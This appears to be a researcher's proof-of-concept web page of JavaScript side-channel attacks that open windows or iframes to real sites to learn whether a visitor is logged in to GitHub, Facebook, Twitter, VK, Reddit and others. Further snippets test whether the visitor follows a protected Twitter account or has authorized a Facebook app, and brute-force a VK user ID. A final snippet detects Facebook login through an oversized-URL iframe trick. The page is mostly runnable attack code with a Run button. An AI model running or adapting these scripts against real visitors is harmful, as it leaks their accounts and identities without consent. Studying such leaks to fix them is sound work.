<h1>URL and redirection detection</h1>
<script>

var wins = []


var postback = function(data){
  var data = data.split(',')
  var guess = data[0] == '2';
  var id = parseInt(data[1]);

  if(wins[id].started){
    if(full_debug){
      //debug('Processing time (ms): '+ (new Date - wins[id].started))
    }

    wins[id].cb(guess);
    //optional
    //wins[e.data.id].w.close()
    //http://www.whatwg.org/specs/web-apps/current-work/#security-window
    //wins[e.data.id].w.history.go(guess ? 1 : 2)
  }
}


window.onmessage=postback;

var debug=function(d){
  deb.innerHTML=deb.innerHTML+"<br>"+d;
}

var path_for = function(data){
  //if(data=='3'){
  //  return 'data:text/html,<script>history.go(-3);<'+'/script>'
  //}else{
    return '/postback.html#'+data;
  //}
    //'data:text/html,<script>opener.postMessage({result: false,id:'+id+'},"*")<'+'/script>'
}

var check_redirect = function(base, cb, assigner){
  var id = wins.length;
  var path = path_for('1,'+id);
  if(use_frames){
    document.write('<iframe src="'+path+'" name="f'+id+'"></iframe>')
    var w = frames['f'+id];
  }else{
    var w = window.open(path);
  }

  wins[id] = {
    w: w,
    started: false,
    cb: cb
  }

  setTimeout(function(){
    w.location=path_for('2,'+id);
  },data_timeout)

  setTimeout(function(){
    w.location = base;

    setTimeout(function(){
      wins[id].started = new Date;
      //if(full_debug) debug('Started at '+ wins[id].started);

      if(assigner){
        assigner(wins[id].w);
      }else{
        // check exactly same URL
        w.location = base+'#';
      }

      setTimeout(function(){
      if(direct_history){
        w.history.go(-2);
      }else{
        w.location = path_for('3,'+id)
      }
      },100)
      var checker = function(){
        resp = w.location.hash;
        if(resp){
        //if(full_debug) debug('Received: '+resp);
          postback( resp.slice(1) );
          w.close();
        }else{
          setTimeout(checker,1000)
        }
      }
      checker();

    },timeout)
  },data_timeout * 2);
  return w;
}


var run = function(){
  window.eval(ev.value)
}
var direct_history=true; //false in non-webkit 
var full_debug=true;
var timeout=10000;
var data_timeout = 1000;
var use_frames = false;

//window.onload = run;

</script>

<br><a href=javascript:void(0) onclick="run()">Run</a>
<br>
<textarea id="ev" style="width:600px;height:200px;">
var direct_history=true; //false in non-webkit 
var full_debug=true;
var timeout=10000;
var data_timeout = 1000;


var sites = {
  github: 'https://github.com/notifications',
  fb: 'https://www.facebook.com/messages/new',
  gplus: 'https://plus.google.com/photos/instantupload',
  twitter: 'https://twitter.com/following',
  vk: 'http://vk.com/friends',
  devianart: 'http://my.deviantart.com/messages/',
  reddit: 'http://www.reddit.com/message/inbox/'
}
var result = {}
for(var site in sites){
  var cb = (function(site){ 
    return function(guess){
    debug('Logged in on '+site+': '+ (guess ? 'yes' : 'no'));
    result[site] = guess;
  }; 
  })(site)
  check_redirect(sites[site], cb)  
}

</textarea>
<b><div id="deb">Log (yes means definitely yes, no means most likely no but can be mistaken because of network speed - double check!)</div></b>

<pre>
Other examples (you can copy code to textarea and press Run or simply use firebug/web inspector):

check_redirect('https://twitter.com/PROTECTED/favorites', function(guess){
  debug('Has access to protected account: '+ (guess ? 'yes' : 'no'));
})

check_redirect('https://www.facebook.com/dialog/oauth?client_id='+(tryapp=prompt('choose app, e.g. 114545895322903'))+'&redirect_uri=https%3A%2F%2Fm.facebook.com', function(guess){
  debug('Authorized app '+tryapp+'  '+(guess ? 'no' : 'yes'));
})

//vkontakte ID detection


var vk_base = 'http://m.vk.com/photos';
var start = parseInt(prompt('In which 100 000 your ID is? for example 12300000'));
var steps = [100000,10000,1000,100,10,1];

var get_assigner = function(from, to){
  return function(w){
    for(var i=from;i < to;i++){
      w.location='http://m.vk.com/photos'+i+'#';
      if(i%10000==0) console.log('bunch '+i);
    }
  }
}

check_redirect(vk_base, function(guess){
  debug('ID inside of '+start+'  '+(guess ? 'yes' : 'no'));
}, get_assigner(start, start+100000))

//not finished proto of exploit

var get_cb = function(start){
  return function(guess){
    if(!guess) return false;

    var step = steps.shift();
    if(step){
      for(var i=0;i < 10;i++){
        var from = start+i*step;
        var to = start+(i+1)*step;
        console.log('start from '+from);

        (check_redirect(vk_base, get_cb(from,to), get_assigner(from,to)));
      }      

    }else{
      debug('vk id found: '+ start);
    }
  };
}


get_cb(your_mln)(true)

</pre>
<hr/>
<h1>Clickjacking URL-change detection</h1>



<hr/>
<h1>414 and X-Frame-Options based detection</h1>
<pre>
var a='';
for(var i=0;i<50000;i++){a+='=';}

var wait = setTimeout(function(){
  alert('Logged in fb')
},15000)

var cb=function(){
  clearTimeout(wait);
  alert('Not logged in fb');
}

a='https://www.facebook.com/messages/new?'+a;
console.log(a.length);
document.write('<'+'iframe onload="cb()" src="'+a+'"><'+'/iframe>')
</pre>
